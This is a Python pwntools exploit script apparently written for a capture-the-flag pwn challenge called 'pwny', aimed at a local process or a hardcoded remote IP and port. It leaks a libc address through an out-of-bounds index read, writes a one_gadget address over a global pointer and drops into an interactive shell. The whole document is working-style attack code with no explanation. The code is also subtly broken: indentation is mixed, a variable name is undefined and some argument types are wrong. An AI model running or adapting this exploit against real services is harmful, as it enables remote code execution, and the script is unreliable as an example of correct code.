from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level='debug'
debug = 1
if debug == 1:
    p = process("./pwny")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
    p = remote('124.71.231.29',20838)
    libc = ELF("./libc-2.27.so",checksec=False)

elf = ELF("./pwny",checksec=False)
one = [0x4f3d5,0x4f432,0x10a41c]
def read_0(index):
    p.sendlineafter("choice: ",str(1))
    p.sendafter("Index: ",str(index))

def write_0(index,content):
    p.sendlineafter("Your choice: ",str(2))
    p.sendafter("Index: ",str(index))
    p.send(content)

def pwn():
    try:
        p.sendlineafter('choice: ','2')
        p.sendlineafter('Index: ',str(0x100)) # over random 
        read_0(p64(0xfffffffffffffff8))
        p.recvuntil("Result: ")
        stdout = p.recvline()[:-1]
        if stdout == '0':
            return False;
        libc.address = int(stdout,16) - libc.sym["_IO_2_1_stdout_"]
        og = one[1] + libc.address
        global0 = libc.address + 0x61bf68
        payload = p64(0xfffffffffffffff5)
        read_0(payload)
		p.recvuntil("Result: ")
        addr_bss = int(p.recvline()[:-1], 16) + 0x58
		success("libc.address = " + hex(libc.address))
        success("one = " + hex(og))
        success("addr_bss = " + hex(addr_bss))
        success("global0 = " + hex(global0))
            
        
        index = (global_ - addr_bss)/8
        write_0(str(index),og)
        p.sendline(str(3))

        p.interactive()
        p.close()
    except EOFError:
        p.close()
            
if __name__=="__main__":
    pwn()

